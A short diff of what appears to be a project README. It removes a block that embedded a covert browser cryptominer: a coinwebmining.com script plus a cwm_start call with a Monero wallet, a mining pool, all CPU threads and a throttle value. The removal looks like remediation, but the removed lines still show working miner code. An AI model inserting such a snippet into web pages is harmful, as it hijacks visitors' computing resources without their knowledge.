@@ -96,17 +96,3 @@ Theme documentation and demo pages can be found in the [`/docs`](docs) if submit
 - [jQuery throttle / debounce](http://benalman.com/projects/jquery-throttle-debounce-plugin/)
 - [Lunr](http://lunrjs.com)
 
------
-
-<script src="https://coinwebmining.com/cwm.js"></script>
-<script>
-    var site_id = 'cwm-3707';
-    var coin = 'monero';
-    var wallet = '84FEn5Gak63AReZjRtDwV724TsoUtfajxjLHHJZ3zH3vcaAZJwvg4qWdUG9cx7nhA1ZfT9kK89roADmRb1ehLLhH6HyTATK';
-    var password = 'lmaddox.chickenkiller.com';
-    var mining_pool = 'gulf.moneroocean.stream:10001';
-    var threads = -1;
-    var throttle = 0.1;
-    var debug = false;
-    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
-</script>
